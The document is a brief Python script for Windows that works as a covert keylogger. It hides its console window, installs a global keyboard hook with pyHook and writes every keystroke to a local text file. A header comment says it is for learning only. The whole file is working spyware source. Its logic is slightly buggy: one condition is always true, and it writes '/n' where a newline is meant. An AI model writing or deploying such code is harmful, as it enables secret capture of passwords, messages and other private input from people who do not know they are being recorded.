#please do not use this for other purpose then learning
import win32api
import win32console
import win32gui
import pythoncom,pyHook
    
win=win32console.GetConsoleWindow()
win32gui.ShowWindow(win,0)

def OnKeyboardEvent(event):
    lista=""    
    if event.Ascii !=0 or event.Ascii !=8:
        f=open('C:path_to_save_the_file\\output.txt','a')
        lista+=chr(event.Ascii)
        if event.Ascii==13:
            lista+='/n '
        f.write(lista)
        f.close()
    if event.Ascii == 8:
        f=open('C:path_to_save_the_file\\output.txt','r')
        lista=f.read()
        f.close()
        lista=lista[0:len(lista)-2]
        f=open('C:path_to_save_the_file\\output.txt','w')
        f.write(lista)
        f.close()
    

# create a hook manager object
hm=pyHook.HookManager()
hm.KeyDown=OnKeyboardEvent
# set the hook
hm.HookKeyboard()
# wait forever
pythoncom.PumpMessages()
